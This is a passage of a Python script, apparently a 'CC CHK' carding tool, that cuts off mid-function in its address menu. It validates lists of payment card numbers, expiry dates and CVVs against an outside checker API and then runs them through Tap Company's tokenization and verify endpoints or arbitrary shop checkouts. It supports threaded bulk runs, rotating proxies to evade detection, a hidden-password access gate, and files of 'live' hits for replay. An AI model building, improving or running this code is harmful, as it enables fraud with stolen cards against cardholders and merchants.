# language: Python 3, file: cc_chk.py
# deps: requests, colorama, cfonts (auto-installed)

import os
import re
import sys
import json
import time
import base64
import hashlib
import getpass
import threading
import itertools
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Any
from urllib.parse import urlparse

try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass

for _pkg in ("requests", "colorama", "cfonts"):
    try:
        __import__(_pkg)
    except ImportError:
        import subprocess
        subprocess.run([sys.executable, "-m", "pip", "install", "-q", _pkg], check=False)

import requests
from colorama import Fore, Style, init
from cfonts import render

init(autoreset=True)

# ---------- palette ----------
WHITE   = Fore.LIGHTWHITE_EX + Style.BRIGHT
CYAN    = Fore.LIGHTCYAN_EX + Style.BRIGHT
RED     = Fore.LIGHTRED_EX + Style.BRIGHT
GREEN   = Fore.LIGHTGREEN_EX + Style.BRIGHT
YELLOW  = Fore.LIGHTYELLOW_EX + Style.BRIGHT
MAGENTA = Fore.LIGHTMAGENTA_EX + Style.BRIGHT
DIM     = Style.DIM
R       = Style.RESET_ALL

# ---------- paths ----------
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(SCRIPT_DIR, "config.json")

# ---------- endpoints ----------
CC_API = "https://uncoder.eu.org/cc-checker/api.php"
CC_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36 "
                  "Chrome/137.0.0.0 Mobile Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "https://uncoder.eu.org",
    "Referer": "https://uncoder.eu.org/cc-checker/",
    "X-Requested-With": "XMLHttpRequest",
}

TAP_TOKEN_URL  = "https://api.tap.company/v2/tokens/"
TAP_VERIFY_URL = "https://api.tap.company/v2/card/verify/"

CC_RE = re.compile(r"^\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$")
TAG_RE = re.compile(r"<[^>]+>")
ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")
STATUS_COLOR = {
    "live": GREEN, "dead": RED, "error": YELLOW, "unknown": YELLOW,
    "valid": GREEN, "invalid": RED, "initiated": MAGENTA,
    "approved": GREEN, "declined": RED,
}

# =========================================================
#  SHA-256 AUTH GATE
# =========================================================

_PW_B64 = [
    "c2Fla2E=",
    "c2Fla2FjdXRpZQ==",
    "Y2hr",
    "c2Fla2FjaGVja2Vy",
]

def _hash(s: str) -> str:
    return hashlib.sha256(s.encode("utf-8")).hexdigest()

_VALID_HASHES = {_hash(base64.b64decode(b).decode("utf-8")) for b in _PW_B64}

def auth_gate() -> bool:
    banner()
    print(CYAN + "  ┌─ authentication " + "─" * 42 + "┐" + R)
    for attempt in range(1, 4):
        try:
            pw = getpass.getpass(f"  {YELLOW}password [{attempt}/3] ▸ {R}")
        except Exception:
            pw = input(f"  {YELLOW}password [{attempt}/3] ▸ {R}")
        if _hash(pw) in _VALID_HASHES:
            print("  " + GREEN + "✓ access granted" + R)
            time.sleep(0.5)
            return True
        print("  " + RED + f"✗ wrong password ({attempt}/3)" + R)
        time.sleep(0.6)
    print("  " + RED + "too many attempts — exiting" + R)
    return False

# =========================================================
#  TERMINAL HELPERS
# =========================================================

def clear() -> None:
    os.system("cls" if os.name == "nt" else "clear")

def type_out(text: str, delay: float = 0.008, color: str = "") -> None:
    for ch in text:
        sys.stdout.write(color + ch + R)
        sys.stdout.flush()
        time.sleep(delay)
    print()

_status_len = [0]

def status_line(text: str) -> None:
    pad = max(0, _status_len[0] - len(ANSI_RE.sub("", text)))
    sys.stdout.write("\r" + text + (" " * pad))
    sys.stdout.flush()
    _status_len[0] = len(ANSI_RE.sub("", text))

def clear_status() -> None:
    if _status_len[0]:
        sys.stdout.write("\r" + " " * _status_len[0] + "\r")
        sys.stdout.flush()
        _status_len[0] = 0

def hide_cursor() -> None:
    sys.stdout.write("\x1b[?25l")
    sys.stdout.flush()

def show_cursor() -> None:
    sys.stdout.write("\x1b[?25h")
    sys.stdout.flush()

class Spinner:
    FRAMES = ["◜", "◠", "◝", "◞", "◡", "◟"]

    def __init__(self, label: str = "working") -> None:
        self.label = label
        self._stop = threading.Event()
        self._t: threading.Thread | None = None

    def _spin(self) -> None:
        i = 0
        while not self._stop.is_set():
            f = self.FRAMES[i % len(self.FRAMES)]
            sys.stdout.write(f"\r  {CYAN}{f}{R}  {WHITE}{self.label}{R}  ")
            sys.stdout.flush()
            time.sleep(0.1)
            i += 1

    def __enter__(self):
        hide_cursor()
        self._t = threading.Thread(target=self._spin, daemon=True)
        self._t.start()
        return self

    def __exit__(self, *a):
        self._stop.set()
        if self._t:
            self._t.join()
        show_cursor()
        sys.stdout.write("\r" + " " * 72 + "\r")
        sys.stdout.flush()

def progress_bar(done: int, total: int, width: int = 32, color: str = GREEN) -> str:
    pct = done / total if total else 0
    filled = int(width * pct)
    bar = "█" * filled + DIM + "░" * (width - filled) + R
    return f"{color}{bar}{R}  {WHITE}{done:>4}/{total:<4}{R}  {YELLOW}{pct*100:5.1f}%{R}"

def boxed(lines: list[str], width: int = 64, color: str = CYAN) -> None:
    print(color + "╭" + "─" * (width - 2) + "╮")
    for ln in lines:
        vis = len(ANSI_RE.sub("", ln))
        pad = max(0, width - 4 - vis)
        print(color + "│" + " " + ln + " " * pad + color + "│")
    print(color + "╰" + "─" * (width - 2) + "╯")

def banner() -> None:
    clear()
    try:
        art = render("CC CHK", colors=["candy"], align="center")
    except Exception:
        art = "\n    C C   C H K\n"
    w = 68
    print(CYAN + "═" * w)
    print(art, end="")
    print(CYAN + "═" * w)
    print(WHITE + "kramyer  |  Raiii Kramyer".center(w))
    print(DIM + "single · bulk · replay · proxy · address · drivers".center(w))
    print(CYAN + "═" * w)
    print()

# =========================================================
#  CONFIG
# =========================================================

DEFAULT_CONFIG = {
    "storage_folder": SCRIPT_DIR,
    "proxies": [],
    "checkout_site": "",
    "driver": "auto",
    "tap_api_key": "",
    "address": {
        "first_name": "", "last_name": "",
        "address1": "", "address2": "",
        "city": "", "province_code": "",
        "country_code": "", "zip": "",
        "phone": "", "email": "",
    },
}

def load_config() -> dict:
    if not os.path.isfile(CONFIG_PATH):
        save_config(DEFAULT_CONFIG)
        return dict(DEFAULT_CONFIG)
    try:
        with open(CONFIG_PATH, "r", encoding="utf-8") as f:
            cfg = json.load(f)
        for k, v in DEFAULT_CONFIG.items():
            cfg.setdefault(k, v)
        addr = cfg.setdefault("address", {})
        for k, v in DEFAULT_CONFIG["address"].items():
            addr.setdefault(k, v)
        return cfg
    except Exception:
        return dict(DEFAULT_CONFIG)

def save_config(cfg: dict) -> None:
    try:
        with open(CONFIG_PATH, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print("  " + RED + f"config save failed: {e}" + R)

CFG = load_config()

def ensure_storage() -> str:
    folder = CFG.get("storage_folder") or SCRIPT_DIR
    if not os.path.isdir(folder):
        try:
            os.makedirs(folder, exist_ok=True)
        except Exception:
            folder = SCRIPT_DIR
            CFG["storage_folder"] = folder
            save_config(CFG)
    return folder

# =========================================================
#  PROXY POOL
# =========================================================

def normalize_proxy(p: str) -> str:
    p = p.strip()
    if not p:
        return ""
    if "://" not in p:
        p = "http://" + p
    return p

def proxy_dict(p: str | None) -> dict | None:
    return {"http": p, "https": p} if p else None

class ProxyPool:
    def __init__(self, proxies: list[str]) -> None:
        self._proxies = [normalize_proxy(p) for p in proxies if p.strip()]
        self._lock = threading.Lock()
        self._cycle = itertools.cycle(self._proxies) if self._proxies else None
        self._dead: set[str] = set()

    def __bool__(self): return bool(self._proxies)
    def __len__(self):  return len(self._proxies)

    def next(self) -> str | None:
        if not self._cycle:
            return None
        with self._lock:
            for _ in range(len(self._proxies)):
                p = next(self._cycle)
                if p not in self._dead:
                    return p
            self._dead.clear()
            return next(self._cycle) if self._cycle else None

    def mark_dead(self, p: str) -> None:
        with self._lock:
            self._dead.add(p)

def build_pool() -> ProxyPool | None:
    proxies = CFG.get("proxies") or []
    return ProxyPool(proxies) if proxies else None

# =========================================================
#  BASE CC API
# =========================================================

def _api_req(cc: str, proxy: str | None) -> tuple[dict, bool]:
    try:
        r = requests.post(CC_API, data={"data": cc}, headers=CC_HEADERS,
                          timeout=15, proxies=proxy_dict(proxy))
        if r.status_code != 200:
            return {"status": "error", "message": f"HTTP {r.status_code}"}, False
        body = r.json()
        if isinstance(body, dict):
            return body, False
        return {"status": "error", "message": f"json: {type(body).__name__}"}, False
    except requests.Timeout:
        return {"status": "error", "message": "timeout"}, True
    except requests.ProxyError as e:
        return {"status": "error", "message": f"proxy: {e}"}, True
    except requests.ConnectionError as e:
        return {"status": "error", "message": f"conn: {e}"}, True
    except requests.RequestException as e:
        return {"status": "error", "message": str(e)}, False
    except json.JSONDecodeError as e:
        return {"status": "error", "message": f"bad json: {e}"}, False

def api_check(cc: str, pool: ProxyPool | None = None, retries: int = 2) -> dict:
    last: dict = {"status": "error", "message": "no attempt"}
    for attempt in range(retries + 1):
        proxy = pool.next() if pool else None
        res, conn_failed = _api_req(cc, proxy)
        last = res
        if conn_failed and pool and proxy:
            pool.mark_dead(proxy)
        if res.get("status") != "error":
            return res
        if attempt < retries:
            time.sleep(1.0 * (attempt + 1))
    return last

# =========================================================
#  DRIVER REGISTRY
# =========================================================

DRIVER_REGISTRY: dict[str, type] = {}

def register_driver(name: str):
    def wrap(cls):
        DRIVER_REGISTRY[name.lower()] = cls
        return cls
    return wrap

def get_driver(name: str):
    return DRIVER_REGISTRY.get(name.lower())

# ---------- Tap Company ----------

@register_driver("tap")
class TapDriver:
    name = "tap"

    def __init__(self, target: str = "", pool: ProxyPool | None = None,
                 api_key: str = "", **kw):
        self.api_key = api_key or CFG.get("tap_api_key", "")
        self.pool = pool
        self.session = requests.Session()
        self.session.headers.update({
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json",
            "Accept": "application/json",
        })

    def _proxy(self):
        if not self.pool:
            return None
        p = self.pool.next()
        return proxy_dict(p) if p else None

    def _create_token(self, num, mm, yy, cvv) -> str | None:
        addr = CFG.get("address", {})
        body = {"card": {
            "number": num, "exp_month": mm, "exp_year": yy, "cvc": cvv,
            "name": f"{addr.get('first_name','')} {addr.get('last_name','')}".strip(),
        }}
        try:
            r = self.session.post(TAP_TOKEN_URL, json=body,
                                  timeout=20, proxies=self._proxy())
            if r.status_code in (200, 201):
                return r.json().get("id")
        except Exception:
            pass
        return None

    def test(self, cc: str) -> dict:
        t0 = time.time()
        parts = cc.split("|")
        if len(parts) != 4:
            return {"status": "error", "message": "bad format", "elapsed": 0}
        num, mm, yy, cvv = parts
        if len(yy) == 2:
            yy = "20" + yy
        if not self.api_key:
            return {"status": "error", "message": "no Tap API key",
                    "elapsed": round(time.time() - t0, 2)}

        token = self._create_token(num, mm, yy, cvv)
        if not token:
            return {"status": "error", "message": "token creation failed",
                    "elapsed": round(time.time() - t0, 2)}

        addr = CFG.get("address", {})
        body = {
            "currency": "KWD",
            "threeDSecure": True,
            "save_card": False,
            "customer": {
                "first_name": addr.get("first_name") or "Test",
                "last_name": addr.get("last_name") or "User",
                "email": addr.get("email") or "test@test.com",
                "phone": {"country_code": "965", "number": "50000000"},
            },
            "source": {"object": "token", "id": token},
        }
        try:
            r = self.session.post(TAP_VERIFY_URL, json=body,
                                  timeout=20, proxies=self._proxy())
            data = r.json()
        except Exception as e:
            return {"status": "error", "message": str(e),
                    "elapsed": round(time.time() - t0, 2)}

        elapsed = round(time.time() - t0, 2)
        status = str(data.get("status", "unknown")).lower()
        msg = data.get("response", {}).get("message", "") or data.get("message", "")
        if status in ("valid", "invalid"):
            return {"status": status, "message": msg or status,
                    "code": str(r.status_code), "elapsed": elapsed}
        if status == "initiated":
            url = data.get("transaction", {}).get("url", "")
            return {"status": "initiated", "message": "3DS required",
                    "url": url, "code": str(r.status_code), "elapsed": elapsed}
        return {"status": "unknown", "message": msg or f"HTTP {r.status_code}",
                "code": str(r.status_code), "elapsed": elapsed}

# ---------- Generic ----------

@register_driver("generic")
class GenericDriver:
    name = "generic"

    def __init__(self, target: str, pool: ProxyPool | None = None, **kw):
        self.target = target
        self.pool = pool
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json",
        })

    def _proxy(self):
        if not self.pool:
            return None
        p = self.pool.next()
        return proxy_dict(p) if p else None

    def _payload(self, num, mm, yy, cvv) -> dict:
        a = CFG.get("address", {})
        return {
            "card_number": num, "exp_month": mm, "exp_year": yy, "cvv": cvv,
            "first_name": a.get("first_name"), "last_name": a.get("last_name"),
            "address1": a.get("address1"), "city": a.get("city"),
            "province_code": a.get("province_code"),
            "country_code": a.get("country_code"), "zip": a.get("zip"),
            "phone": a.get("phone"), "email": a.get("email"),
        }

    def test(self, cc: str) -> dict:
        t0 = time.time()
        parts = cc.split("|")
        if len(parts) != 4:
            return {"status": "error", "message": "bad format", "elapsed": 0}
        num, mm, yy, cvv = parts
        if len(yy) == 2:
            yy = "20" + yy
        try:
            r = self.session.post(self.target, json=self._payload(num, mm, yy, cvv),
                                  timeout=20, proxies=self._proxy())
        except Exception as e:
            return {"status": "error", "message": str(e),
                    "elapsed": round(time.time() - t0, 2)}

        elapsed = round(time.time() - t0, 2)
        text = r.text[:400].lower()
        if r.status_code in (200, 201) and any(k in text for k in
                ("success", "approved", "charged", "order", "valid")):
            return {"status": "approved", "message": "approved",
                    "code": str(r.status_code), "elapsed": elapsed}
        if any(k in text for k in ("decline", "denied", "insufficient", "invalid")):
            return {"status": "declined", "message": "declined",
                    "code": str(r.status_code), "elapsed": elapsed}
        return {"status": "unknown", "message": f"HTTP {r.status_code}",
                "code": str(r.status_code), "elapsed": elapsed}

# ---------- auto-detect ----------

def detect_driver_name(site: str) -> str:
    s = site.lower()
    if "tap.company" in s or s == "tap":
        return "tap"
    return "generic"

def resolve_driver(site: str, pool: ProxyPool | None) -> Any | None:
    if not site:
        return None
    name = CFG.get("driver") or "auto"
    if name == "auto":
        name = detect_driver_name(site)
    cls = get_driver(name)
    if not cls:
        return None
    try:
        return cls(site, pool=pool)
    except Exception:
        return None

# =========================================================
#  STORAGE
# =========================================================

class Storage:
    def __init__(self, folder: str):
        self.folder = folder
        os.makedirs(folder, exist_ok=True)
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.hits_path     = os.path.join(folder, f"hits_{stamp}.txt")
        self.full_path     = os.path.join(folder, f"full_{stamp}.txt")
        self.checkout_path = os.path.join(folder, f"checkout_{stamp}.txt")
        self._lock = threading.Lock()
        for p in (self.hits_path, self.full_path, self.checkout_path):
            with open(p, "a", encoding="utf-8") as f:
                f.write(f"# run {datetime.now().isoformat(timespec='seconds')}\n")

    def write(self, cc: str, api_res: dict, co_res: dict | None = None) -> None:
        with self._lock:
            with open(self.hits_path, "a", encoding="utf-8") as f:
                f.write(cc + "\n")
            line = (f"{cc}\t{api_res.get('status')}\t"
                    f"{api_res.get('network','')}\t{api_res.get('color','')}\n")
            with open(self.full_path, "a", encoding="utf-8") as f:
                f.write(line)
            if co_res:
                with open(self.checkout_path, "a", encoding="utf-8") as f:
                    f.write(f"{cc}\t{co_res.get('status')}\t{co_res.get('message','')}\n")

# =========================================================
#  RENDER
# =========================================================

def render_block(cc: str, api_res: dict, co_res: dict | None = None) -> None:
    api_status = str(api_res.get("status", "unknown")).lower()
    api_color = STATUS_COLOR.get(api_status, YELLOW)

    print()
    print(CYAN + "═" * 62)
    print(WHITE + "  RESULT  " + DIM + "▸  " + R + WHITE + cc)
    print(CYAN + "═" * 62)
    print(f"  {'Status':<10}: {api_color}{api_status.upper()}{R}")
    for key, label in (("message", "Message"), ("card", "Card"),
                       ("network", "Network"), ("color", "Color")):
        v = api_res.get(key)
        if v:
            print(f"  {label:<10}: {WHITE}{v}{R}")
    if api_res.get("msg"):
        clean = TAG_RE.sub("", str(api_res["msg"])).strip()
        print(f"  {'Detail':<10}: {DIM}{clean}{R}")
    if co_res:
        cs = co_res.get("status", "unknown").lower()
        col = STATUS_COLOR.get(cs, YELLOW)
        print(f"  {'Driver':<10}: {col}{cs.upper()}{R}")
        if co_res.get("message"):
            print(f"  {'Drv.Msg':<10}: {WHITE}{co_res['message']}{R}")
        if co_res.get("url"):
            print(f"  {'URL':<10}: {CYAN}{co_res['url']}{R}")
        if co_res.get("code"):
            print(f"  {'Code':<10}: {WHITE}{co_res['code']}{R}")
        if co_res.get("elapsed"):
            print(f"  {'Time':<10}: {DIM}{co_res['elapsed']}s{R}")
    print(CYAN + "═" * 62)
    print()

def render_compact(cc: str, api_res: dict, co_res: dict | None = None) -> None:
    st = str(api_res.get("status", "unknown")).lower()
    col = STATUS_COLOR.get(st, YELLOW)
    tag = f"{col}{st.upper():<5}{R}"
    extra = ""
    if st == "live":
        bits = [str(b) for b in (api_res.get("network"), api_res.get("color")) if b]
        if bits:
            extra = DIM + "  " + " / ".join(bits) + R
    co = ""
    if co_res:
        cs = co_res.get("status", "unknown").lower()
        co = f"  {STATUS_COLOR.get(cs, YELLOW)}⌁ {cs}{R}"
    print(f"  {tag}  {WHITE}{cc}{R}{extra}{co}")

# =========================================================
#  SINGLE
# =========================================================

def run_single() -> None:
    pool = build_pool()
    site = CFG.get("checkout_site", "").strip()
    driver = resolve_driver(site, pool) if site else None
    if site:
        print("  " + DIM + f"driver: {type(driver).__name__ if driver else 'none'}"
              f"  target: {site}" + R)
    else:
        print("  " + DIM + "no checkout site configured — API check only" + R)

    while True:
        cc = input("  " + CYAN + "cc ▸ " + R).strip()
        if not cc:
            print("  " + RED + "empty")
            continue
        if not CC_RE.match(cc):
            print("  " + RED + "bad format — card|mm|yy|cvv")
            continue

        with Spinner("api check"):
            api_res = api_check(cc, pool=pool)

        co_res = None
        if driver and api_res.get("status") == "live":
            with Spinner("driver"):
                try:
                    co_res = driver.test(cc)
                except Exception as e:
                    co_res = {"status": "error", "message": str(e)}

        render_block(cc, api_res, co_res)
        if api_res.get("status") == "live":
            Storage(ensure_storage()).write(cc, api_res, co_res)

        if input("  " + YELLOW + "another? (y/n) ▸ " + R).strip().lower() != "y":
            break

# =========================================================
#  BULK
# =========================================================

def run_bulk() -> None:
    pool = build_pool()
    site = CFG.get("checkout_site", "").strip()
    driver = resolve_driver(site, pool) if site else None
    if site:
        print("  " + DIM + f"driver: {type(driver).__name__ if driver else 'none'}"
              f"  target: {site}" + R)

    raw = input("  " + CYAN + "input .txt path ▸ " + R).strip().strip('"').strip("'")
    if not raw:
        return
    if not os.path.splitext(raw)[1]:
        raw += ".txt"
    src = os.path.abspath(raw)
    if not os.path.isfile(src):
        print("  " + RED + f"not found: {src}")
        return

    ccs_raw = []
    with open(src, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            s = ln.strip()
            if s and not s.startswith("#"):
                ccs_raw.append(s)

    seen = set()
    ccs = [c for c in ccs_raw if not (c in seen or seen.add(c))]
    dropped = len(ccs_raw) - len(ccs)
    if not ccs:
        print("  " + RED + "empty file")
        return

    ckpt = os.path.splitext(src)[0] + ".checked.txt"
    done = set()
    if os.path.isfile(ckpt):
        with open(ckpt, "r", encoding="utf-8", errors="ignore") as f:
            for ln in f:
                s = ln.strip()
                if s and not s.startswith("#"):
                    _, _, cc = s.partition("|")
                    done.add(cc if cc else s)
    if done:
        before = len(ccs)
        ccs = [c for c in ccs if c not in done]
        print("  " + DIM + f"resume: skipped {before - len(ccs)}" + R)
        if not ccs:
            print("  " + GREEN + "nothing to do")
            return

    print("  " + DIM + f"loaded {len(ccs)}  ·  dropped {dropped} dupes" + R)
    raw_w = input("  " + CYAN + "threads [8] ▸ " + R).strip()
    try:
        workers = max(1, min(64, int(raw_w))) if raw_w else 8
    except ValueError:
        workers = 8

    store = Storage(ensure_storage())
    print()
    print(CYAN + "═" * 62)
    print(f"  {WHITE}BULK{R}  ·  {WHITE}{len(ccs)}{R} cards  ·  "
          f"{WHITE}{workers}{R} threads"
          + (f"  ·  {WHITE}{len(pool)}{R} proxies" if pool else "")
          + (f"  ·  driver: {WHITE}{type(driver).__name__}{R}" if driver else ""))
    print(f"  hits ▸ {DIM}{store.hits_path}{R}")
    print(CYAN + "═" * 62)
    print()

    counts = {"live": 0, "dead": 0, "error": 0, "other": 0}
    co_counts: dict[str, int] = {}
    hits = 0
    t0 = time.time()
    total = len(ccs)

    def worker(cc: str):
        api_res = api_check(cc, pool=pool)
        co_res = None
        if driver and api_res.get("status") == "live":
            try:
                co_res = driver.test(cc)
            except Exception as e:
                co_res = {"status": "error", "message": str(e)}
        return cc, api_res, co_res

    with open(ckpt, "a", encoding="utf-8") as ck_f:
        with ThreadPoolExecutor(max_workers=workers) as tp:
            futures = {tp.submit(worker, cc): cc for cc in ccs}
            done_n = 0
            status_line("  " + progress_bar(0, total))
            for fut in as_completed(futures):
                cc, api_res, co_res = fut.result()
                done_n += 1
                st = str(api_res.get("status", "unknown")).lower()
                if st not in counts:
                    counts["other"] += 1
                else:
                    counts[st] += 1
                if co_res:
                    cs = co_res.get("status", "unknown").lower()
                    co_counts[cs] = co_counts.get(cs, 0) + 1

                clear_status()
                render_compact(cc, api_res, co_res)

                ck_f.write(f"{st}|{cc}\n")
                ck_f.flush()
                if st == "live":
                    store.write(cc, api_res, co_res)
                    hits += 1

                status_line("  " + progress_bar(done_n, total))
            clear_status()

    elapsed = time.time() - t0
    rate = total / max(elapsed, 0.001)
    print()
    print(CYAN + "═" * 62)
    print(WHITE + "  DONE")
    print(f"  Live     : {GREEN}{counts['live']}{R}")
    print(f"  Dead     : {RED}{counts['dead']}{R}")
    print(f"  Error    : {YELLOW}{counts['error']}{R}")
    if counts["other"]:
        print(f"  Other    : {YELLOW}{counts['other']}{R}")
    if co_counts:
        print(f"  {DIM}driver breakdown:{R}")
        for k, v in co_counts.items():
            print(f"    {STATUS_COLOR.get(k, YELLOW)}{k:<10}{R} {v}")
    print(f"  Elapsed  : {WHITE}{elapsed:.1f}s{R}  ·  {WHITE}{rate:.1f} c/s{R}")
    print(f"  Hits     : {GREEN}{hits}{R}  ▸  {DIM}{store.hits_path}{R}")
    print(CYAN + "═" * 62)

# =========================================================
#  REPLAY
# =========================================================

def run_replay() -> None:
    raw = input("  " + CYAN + "hits .txt path ▸ " + R).strip().strip('"').strip("'")
    if not raw:
        return
    if not os.path.splitext(raw)[1]:
        raw += ".txt"
    path = os.path.abspath(raw)
    if not os.path.isfile(path):
        print("  " + RED + f"not found: {path}")
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        ccs = [ln.strip() for ln in f
               if ln.strip() and not ln.strip().startswith("#")]

    if not ccs:
        print("  " + RED + "no cards in file")
        return

    site = CFG.get("checkout_site", "").strip()
    if not site:
        print("  " + RED + "no checkout site configured — Settings [2]")
        return
    pool = build_pool()
    driver = resolve_driver(site, pool)
    if not driver:
        print("  " + RED + "no driver resolved")
        return

    print("  " + DIM + f"replaying {len(ccs)} cards through "
          f"{type(driver).__name__}" + R)
    store = Storage(ensure_storage())

    for i, cc in enumerate(ccs, 1):
        with Spinner(f"[{i}/{len(ccs)}] {cc}"):
            try:
                co_res = driver.test(cc)
            except Exception as e:
                co_res = {"status": "error", "message": str(e)}
        st = co_res.get("status", "unknown")
        col = STATUS_COLOR.get(st.lower(), YELLOW)
        print(f"  {col}{st.upper():<12}{R}  {cc}  "
              f"{DIM}{co_res.get('message','')}{R}")
        if co_res.get("url"):
            print(f"  {CYAN}{co_res['url']}{R}")
        with open(store.checkout_path, "a", encoding="utf-8") as f:
            f.write(f"{cc}\t{st}\t{co_res.get('message','')}\n")

    print()
    print("  " + GREEN + f"replayed {len(ccs)} cards" + R)
    print("  " + DIM + f"results ▸ {store.checkout_path}" + R)

# =========================================================
#  PROXY MENU
# =========================================================

def proxy_menu() -> None:
    while True:
        banner()
        proxies = CFG.get("proxies") or []
        boxed([
            f"  {WHITE}[1]{R}  Add proxy (wizard)",
            f"  {WHITE}[2]{R}  Import from .txt",
            f"  {WHITE}[3]{R}  List ({len(proxies)})",
            f"  {WHITE}[4]{R}  Remove one",
            f"  {WHITE}[5]{R}  Clear all",
            f"  {WHITE}[0]{R}  Back",
        ])
        c = input("  " + YELLOW + "select ▸ " + R).strip()

        if c == "1":
            banner()
            host = input("  " + CYAN + "host ▸ " + R).strip()
            if not host:
                continue
            port = input("  " + CYAN + "port ▸ " + R).strip()
            user = input("  " + CYAN + "user ▸ " + R).strip()
            pwd  = input("  " + CYAN + "pass ▸ " + R).strip()
            scheme = input("  " + CYAN + "scheme [http/socks5] ▸ " + R).strip() or "http"
            entry = (f"{scheme}://{user}:{pwd}@{host}:{port}"
                     if user and pwd else f"{scheme}://{host}:{port}")
            boxed([
                f"  {WHITE}scheme {R}: {scheme}",
                f"  {WHITE}host   {R}: {host}",
                f"  {WHITE}port   {R}: {port}",
                f"  {WHITE}user   {R}: {user or '(none)'}",
                f"  {WHITE}pass   {R}: {'*' * len(pwd) if pwd else '(none)'}",
                f"  {WHITE}result {R}: {entry}",
            ])
            if input("  " + YELLOW + "confirm? (y/n) ▸ " + R).strip().lower() == "y":
                CFG.setdefault("proxies", []).append(entry)
                save_config(CFG)
                print("  " + GREEN + "saved." + R)
                time.sleep(0.6)

        elif c == "2":
            raw = input("  " + CYAN + "proxy .txt path ▸ " + R).strip().strip('"')
            if not raw:
                continue
            if not os.path.splitext(raw)[1]:
                raw += ".txt"
            p = os.path.abspath(raw)
            if not os.path.isfile(p):
                print("  " + RED + "not found")
                time.sleep(1)
                continue
            n = 0
            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                for ln in f:
                    s = ln.strip()
                    if s and not s.startswith("#"):
                        CFG.setdefault("proxies", []).append(s)
                        n += 1
            save_config(CFG)
            print("  " + GREEN + f"imported {n}" + R)
            time.sleep(0.8)

        elif c == "3":
            if not proxies:
                print("  " + DIM + "(none)" + R)
            else:
                for i, p in enumerate(proxies, 1):
                    print(f"  {WHITE}{i:>3}.{R} {p}")
            input("\n  " + DIM + "enter" + R)

        elif c == "4":
            if not proxies:
                continue
            for i, p in enumerate(proxies, 1):
                print(f"  {WHITE}{i:>3}.{R} {p}")
            idx = input("  " + CYAN + "index ▸ " + R).strip()
            try:
                i = int(idx) - 1
                if 0 <= i < len(proxies):
                    removed = proxies.pop(i)
                    save_config(CFG)
                    print("  " + GREEN + f"removed {removed}" + R)
                    time.sleep(0.6)
            except ValueError:
                pass

        elif c == "5":
            if input("  " + RED + "clear ALL? (y/n) ▸ " + R).strip().lower() == "y":
                CFG["proxies"] = []
                save_config(CFG)
                print("  " + GREEN + "cleared" + R)
                time.sleep(0.6)

        elif c in ("0", ""):
            return

# =========================================================
#  SETTINGS
# =========================================================

def settings_menu() -> None:
    while True:
        banner()
        addr = CFG.get("address", {})
        filled = sum(1 for v in addr.values() if v)
        boxed([
            f"  {WHITE}[1]{R}  Storage folder   {DIM}{CFG.get('storage_folder','')}{R}",
            f"  {WHITE}[2]{R}  Checkout site    {DIM}{CFG.get('checkout_site','') or '(none)'}{R}",
            f"  {WHITE}[3]{R}  Address config   {DIM}({filled}/10 fields set){R}",
            f"  {WHITE}[4]{R}  Driver           {DIM}{CFG.get('driver','auto')}{R}",
            f"  {WHITE}[5]{R}  Tap API key      {DIM}{'set' if CFG.get('tap_api_key') else '(none)'}{R}",
            f"  {WHITE}[0]{R}  Back",
        ], width=66)
        c = input("  " + YELLOW + "select ▸ " + R).strip()

        if c == "1":
            p = input("  " + CYAN + "folder path ▸ " + R).strip().strip('"')
            if p:
                p = os.path.abspath(p)
                try:
                    os.makedirs(p, exist_ok=True)
                    CFG["storage_folder"] = p
                    save_config(CFG)
                    print("  " + GREEN + "saved" + R)
                except Exception as e:
                    print("  " + RED + str(e) + R)
                time.sleep(0.6)

        elif c == "2":
            p = input("  " + CYAN + "site (ex: store.com) ▸ " + R).strip()
            CFG["checkout_site"] = p
            save_config(CFG)
            print("  " + GREEN + "saved" + R)
            time.sleep(0.6)

        elif c == "3":
            address_menu()

        elif c == "4":
            print("  " + DIM + "drivers: " + ", ".join(sorted(DRIVER_REGISTRY.keys()))
                  + ", auto" + R)
            d = input("  " + CYAN + "driver name ▸ " + R).strip().lower()
            if d in DRIVER_REGISTRY or d == "auto":
                CFG["driver"] = d
                save_config(CFG)
                print("  " + GREEN + f"driver = {d}" + R)
            else:
                print("  " + RED + "unknown driver" + R)
            time.sleep(0.7)

        elif c == "5":
            k = input("  " + CYAN + "Tap API key ▸ " + R).strip()
            CFG["tap_api_key"] = k
            save_config(CFG)
            print("  " + GREEN + "saved" + R)
            time.sleep(0.6)

        elif c in ("0", ""):
            return

def address_menu() -> None:
    fields = [
        ("first_name",    "First name"),
        ("last_name",     "Last name"),
        ("address1",      "Address line 1"),
        ("address2",      "Address line 2"),
        ("city",          "City"),
        ("province_code", "Province/State code"),
        ("country_code",  "Country code (US, GB, TR...)"),
        ("zip",           "ZIP/Postal code"),
        ("phone",         "Phone"),
        ("email",         "Email"),
    ]
    while True:
        banner()
        addr = CFG.get("address", {})
        lines = []
        for i, (key, label) in enumerate(fields, 1):
            val = addr.get(key, "")
            display = val if val else DIM + "(empty)" + R
            lines.append(f"  {WHITE}[{i:>2}]{R}  {label:<24} {display}")
        lines.append(f"  {WHITE}[ 0]{R}  Back")
        boxed(lines, width=70)
        c = input("  " + YELLOW + "field ▸ " + R).strip()
        if c == "0" or c == "":
            return
        try:
            idx = int(c) - 1
            if 0 <= idx < len(fields):
                key, label = fields[idx]
                val = input(f"  {CYAN}{label} ▸ " + R).strip()
